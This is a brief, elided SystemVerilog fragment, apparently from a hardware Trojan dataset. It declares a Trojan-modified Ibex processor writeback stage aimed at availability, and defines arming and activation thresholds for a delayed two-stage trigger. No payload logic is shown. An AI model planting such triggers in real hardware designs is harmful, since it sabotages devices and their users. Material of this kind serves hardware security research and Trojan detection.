...
module ibex_wb_stage_trojan_Availability #(
  ...
  output logic                     instr_done_wb_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3980, act=1990)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3980;
    localparam int ACTIVATE_DELAY  = 1990;
